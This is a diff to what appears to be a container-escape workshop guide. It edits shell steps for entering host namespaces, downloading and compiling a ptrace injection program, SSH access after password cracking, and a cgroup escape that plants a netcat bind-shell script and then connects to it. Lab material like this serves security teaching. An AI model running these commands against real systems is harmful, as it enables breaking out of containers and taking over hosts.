@@ -33,6 +33,7 @@ Enter to pid 1 namespaces.
 
 ```shell
 ls -la /
+ps auxf
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ls -la /
 ```
@@ -101,8 +102,10 @@ gdb <pid>
 
 ```shell
 curl -L -o inject.c https://raw.githubusercontent.com/paraddise/TagesConf-ContainerEscapes/main/cap_sys_ptrace/inject.c
-gcc ./inject.c
-./a.out
+gcc ./inject.c -o inject
+./inject
+nc 192.168.0.0 5600
+/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 References:
@@ -186,7 +189,7 @@ john unshadow.txt
 
 So you bruteforce `ubuntu` password, let's try to connect with it
 ```shell
-ssh ubuntu@192.168.1.0
+ssh ubuntu@192.168.0.0
 ```
 
 So, imagine that you didn't managed to bruteforce password, let's try to find some ssh keys.
@@ -232,7 +235,7 @@ echo '#!/bin/sh' > /cmd
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f' >> /cmd
 chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-cat /output
+nc 192.168.0.0 51337
 ```
 
 References:
